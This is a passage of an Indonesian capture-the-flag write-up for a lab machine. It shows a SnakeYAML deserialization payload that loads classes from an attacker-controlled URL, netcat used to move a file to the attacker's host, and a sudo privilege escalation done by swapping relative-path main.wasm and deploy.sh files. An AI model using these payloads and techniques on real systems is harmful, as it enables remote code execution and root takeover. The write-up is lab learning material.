2.3. YAML Parser Feature#

Saat mencoba menginputkan string “test”, aplikasi memberikan respons yang menyatakan bahwa fitur tersebut sedang di-hold karena ada permasalahan keamanan.

Due to security reason this feature has been temporarily on hold. We will soon fix the issue!

Ketika saya mencoba menginputkan kutip satu ('), aplikasi menampilkan stack trace error. Terlihat bahwa fitur tersebut menggunakan SnakeYAML.

Selanjutnya saya langsung mencari exploitasi dari SnakeYAML.

Hasilnya, terdapat artikel yang menjelaskan tentang kerentanan Deserilization SnakeYAML (CVE-2017-1000207 dan CVE-2017-1000208).

Pada artikel tersebut dijelaskan juga cara pengujiannya. Dengan menggunakan payload berikut kita akan menguji kerentanan deserilization pada fitur YAML Parser.

!!javax.script.ScriptEngineManager [  
  !!java.net.URLClassLoader [[  
    !!java.net.URL ["http://attacker-ip/"]  
  ]]  
]

Sambil menjalankan simple HTTP server, bisa kita lihat terdapat request yang dilakukan oleh server target.

❯ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.10.227 - - [03/Jul/2021 00:30:20] code 404, message File not found
10.10.10.227 - - [03/Jul/2021 00:30:20] "HEAD /META-INF/services/javax.script.ScriptEngineFactory HTTP/1.1" 404 -

Hal ini membuktikan bahwa fitur YAML Parser tersebut rentan terhadap deserilization.

Kesimpulan:

  • Fitur YAML Parser di-hold sementara karena alasan keamanan.
  • Walapun fitur tersebut di-hold, tetapi masih melakukan parsing YAML.
  • Fitur tersebut menggunakan SnakeYAML yang rentan terhadap deserlization.

5. Getting root.txt#

5.1. Sudo abuse#

admin@ophiuchi:~$ sudo -l
Matching Defaults entries for admin on ophiuchi:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User admin may run the following commands on ophiuchi:
    (ALL) NOPASSWD: /usr/bin/go run /opt/wasm-functions/index.go

Terdapat akses root untuk menjalankan file /opt/wasm-functions/index.go. Terlihat bahwa akses ditentukan dengan absolute path, sehingga kita bisa menjalankannya ketika berada di direktori mana pun.

Berikut adalah isi dari file index.go:

admin@ophiuchi:/opt/wasm-functions$ cat index.go 
package main

import (
        "fmt"
        wasm "github.com/wasmerio/wasmer-go/wasmer"
        "os/exec"
        "log"
)


func main() {
        bytes, _ := wasm.ReadBytes("main.wasm")

        instance, _ := wasm.NewInstance(bytes)
        defer instance.Close()
        init := instance.Exports["info"]
        result,_ := init()
        f := result.String()
        if (f != "1") {
                fmt.Println("Not ready to deploy")
        } else {
                fmt.Println("Ready to deploy")
                out, err := exec.Command("/bin/sh", "deploy.sh").Output()
                if err != nil {
                        log.Fatal(err)
                }
                fmt.Println(string(out))
        }
}

Setelah saya pelajari, program tersebut menjalankan Wasmer, yaitu WebAssembly runtime. WebAssembly sendiri adalah binary instruction format untuk stack-based virtual machine. Wasm dirancang sebagai target kompilasi portable untuk bahasa pemrograman, memungkinkan deployment di web untuk aplikasi klien dan server.

Program tersebut akan mengambil nilai dari fungsi info di main.wasm, jika nilainya tidak sama dengan 1, maka file deploy.sh tidak akan di eksekusi.

Jika kita perhatikan program ini memiliki celah, di mana file main.wasm dan deploy.sh ditentukan secara relative path, sehingga kita bisa melakukan manipulasi.

5.2. Main.wasm and deploy.sh manipulation#

Saya menemukan WABT, yaitu WebAssembly Binary Toolkit. Dengan tools ini kita dapat mengubah nilai dari fungsi info.

Pertama-tama download terlebih dahulu main.wasm yang asli ke PC lokal kita.

# Victim PC
admin@ophiuchi:/opt/wasm-functions$ nc -nv 10.10.14.13 1337 < main.wasm
Connection to 10.10.14.13 1337 port [tcp/*] succeeded!

# Attacker PC
❯ nc -l -p 1337 > main.wasm

Dengan menggunakan wasm2wat kita dapat meng-convert binary format ke text format.

❯ /opt/wabt/bin/wasm2wat main.wasm -o main.wat
❯ cat main.wat
(module
  (type (;0;) (func (result i32)))
  (func $info (type 0) (result i32)
    i32.const 0)
  (table (;0;) 1 1 funcref)
  (memory (;0;) 16)
  (global (;0;) (mut i32) (i32.const 1048576))
  (global (;1;) i32 (i32.const 1048576))
  (global (;2;) i32 (i32.const 1048576))
  (export "memory" (memory 0))
  (export "info" (func $info))
  (export "__data_end" (global 1))
  (export "__heap_base" (global 2)))

Selanjutnya, kita ubah nilai dari fungsi info lalu convert lagi menjadi binary format menggunakan wat2wasm.

❯ cat main.wat
(module
  (type (;0;) (func (result i32)))
  (func $info (type 0) (result i32)
    i32.const 1)
  (table (;0;) 1 1 funcref)

6. Closing - What I learned#

  1. Selalu coba injection pada suatu fitur, barangkali ada stack trace error yang dapat membantu kita.
